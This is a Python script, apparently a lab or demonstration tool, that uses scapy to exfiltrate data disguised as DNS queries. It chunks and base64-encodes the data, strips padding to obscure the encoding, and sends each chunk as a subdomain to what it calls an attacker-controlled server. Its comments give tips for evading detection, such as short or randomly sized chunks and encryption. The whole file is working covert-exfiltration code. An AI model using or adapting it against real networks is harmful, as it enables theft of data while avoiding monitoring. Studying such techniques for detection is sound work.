from base64 import b64encode

from scapy.all import *
from scapy.layers.dns import DNS, DNSQR
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether

# Use own IP address here
ip = "172.28.48.1"
domain = "google.com"

"""
Script to send data disguised as DNS query packets to an attacker-controlled server
s"""


def process(response):
    """
    Check for the response code from the attacker-controlled server.
    """
    code = str(response[DNS].an.rdata)[-1]
    if int(code) == 1:
        print("Received successfully")
    elif int(code) == 2:
        print("Acknowledged end transmission")
    else:
        print("Transmission error")


def DNSRequest(subdomain):
    """
    Craft a DNS packet. Subdomain may be arbitrary data to be covertly transmitted to
    attacker-controlled server.
    """
    global domain
    d = bytes(subdomain + "." + domain, "utf-8")
    query = DNSQR(qname=d)
    mac = get_if_hwaddr(conf.iface)
    p = (
        # Ethernet layer is only required if sending requests to localhost for testing
        # Otherwise, remove
        Ether(src=mac, dst=mac)
        / IP(dst=bytes(ip, "utf-8"))
        / UDP(dport=1337)
        / DNS(qd=query)
    )
    # Can use sr1() if omitting Ethernet layer of packet
    result = srp1(p, verbose=False)
    process(result)


def sendData(data):
    """
    Sends data disguised as DNS query requests to an attacker-controlled server masquerading as a DNS server.
    """
    # Data is limited to 10 characters per packet - continually looking up long subdomains could look suspicious
    # Randomly varying data length would be even better
    for i in range(0, len(data), 10):
        chunk = data[i : min(i + 10, len(data))]
        print("Transmitting %s" % chunk)
        # Data can be encrypted for extra security instead of just encoded
        encoded = b64encode(bytes(chunk, "utf-8"))
        print(encoded)
        # Strip trailing equals (b64 padding) to obfuscate b64 encoding
        encoded = encoded.decode("utf-8").rstrip("=")
        DNSRequest(encoded)


data = "This is data being exfiltrated over DNS"
sendData(data)
# Indicate end of transmission - e.g. for separating the contents of multiple files
data = "R"
sendData(data)
